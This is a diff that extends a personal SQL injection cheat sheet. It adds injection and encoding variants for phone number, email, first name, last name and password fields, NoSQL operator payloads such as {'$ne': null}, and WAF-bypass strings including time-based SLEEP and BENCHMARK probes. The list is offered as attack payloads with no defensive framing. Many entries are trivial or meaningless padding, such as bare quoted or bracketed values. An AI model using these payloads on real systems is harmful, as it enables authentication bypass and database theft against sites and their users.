@@ -8,3 +8,175 @@ blind time based SQLi
 'UNION select table_schema, table_name
 FROMinformation_Schema.tables;#
 admin' and substring(password/text(),1,1)='7
+
+mobile number :
+
+1/**/203456789
+1+203456789
+1%2B203456789
+/*!12345SELECT*/ 1203456789
+1' and 1=1 and '1'='1' -- 
+0x31323033343536373839 = BINARY '1203456789'
+ASCII('1203456789')
+LENGTH('1203456789')
+REVERSE('9876543210')
+SUBSTRING('1203456789',1,10)
+CAST('1203456789' AS SIGNED)
+%31%32%30%33%34%35%36%37%38%39       
+0x31323033343536373839               
+CHAR(49,50,48,51,52,53,54,55,56,57)  
+N'1203456789'                       
+' OR 1203456789='1203456789
+" OR 1203456789="1203456789
+'||1203456789||'
+"+1203456789+"
+CONCAT(1203456789)
+CONCAT_WS('-', 1203456789)
+1203456789--
+1203456789#
+1203456789/*
+UNION SELECT 1203456789
+OR 1=1203456789
+AND 1=1203456789
+IF(1=1,1203456789,0)
+(1203456789)
+[1203456789]
+{1203456789}
+<1203456789>
+<iframe src="1203456789">
+/1203456789/
+\1203456789\
+-1203456789-
+=1203456789=
++1203456789+
+~1203456789~
+@1203456789@
+#1203456789#
+%1203456789%
+$1203456789$
+^1203456789^
+*1203456789*
+!1203456789!
+?1203456789?
+:1203456789:
+'1203456789'
+"1203456789"
+`1203456789`
+''1203456789''
+""1203456789""
+```1203456789```
+'`1203456789`'
+"1203456789'"
+'1203456789"'
+\'1203456789\'
+\"1203456789\"
+\\'1203456789\\'
+\\\"1203456789\\\"
+\\1203456789\\
+
+Email: 
+
+'test@example.com'
+"test@example.com"
+`test@example.com`
+''test@example.com''
+""test@example.com""
+\'test@example.com\'
+\"test@example.com\"
+\\test@example.com\\
+%74%65%73%74%40%65%78%61%6D%70%6C%65%2E%63%6F%6D      
+CHAR(116,101,115,116,64,101,120,97,109,112,108,101,46,99,111,109)
+0x74657374406578616d706c652e636f6d                      
+'test@example.com'--
+"test@example.com"#
+'||test@example.com||'
+test' || '@example.com' --
+CONCAT('test','@example.com')
+test"@example.com
+test'@example.com
+test@example.com' OR '1'='1
+test@example.com' -- 
+test@example.com' OR 1=1--
+UNION SELECT 'test@example.com'
+
+Firstname:
+
+'John'
+"John"
+`John`
+\'John\'
+\"John\"
+\\John\\
+%4A%6F%68%6E
+0x4A6F686E   
+CHAR(74,111,104,110)
+'John' OR '1'='1
+"John" OR 1=1 --
+'John'--
+"John"#
+' OR name = 'John
+UNION SELECT 'John'
+CONCAT('Jo','hn')
+
+Last name:
+
+'Doe'
+"Doe"
+`Doe`
+\'Doe\'
+\"Doe\"
+\\Doe\\
+%44%6F%65                   
+0x446F65                      
+CHAR(68,111,101)
+'Doe' OR '1'='1
+"Doe" OR 1=1 --
+'Doe'--
+"Doe"#
+UNION SELECT 'Doe'
+CONCAT('D','oe')
+
+Password:
+
+'password123'
+"password123"
+`password123`
+''password123''
+""password123""
+\'password123\'
+\"password123\"
+\\password123\\
+-password123-
+/password123/
+/*password123*/
+/**/password123
+--password123--
+#password123#
+%password123%
+$password123$
+@password123@
+(password123)
+[password123]
+{password123}
+<password123>
+~password123~
+
+NO-sql
+
+"password": {"$ne": null}
+"password": {"$gt": ""}
+"password": {"$regex": ".*"}
+"password[$ne]": ""
+password[$ne]=1
+
+Waf bypass 
+
+' /*!OR*/ 1=1--
+' /**/OR/**/1=1--
+' OR 1=1;--+
+' OR SLEEP(5)--
+' OR BENCHMARK(10000000,MD5(1))--
+' OR IF(1=1,sleep(5),0)--
+' OR 0x31=0x31
+
+
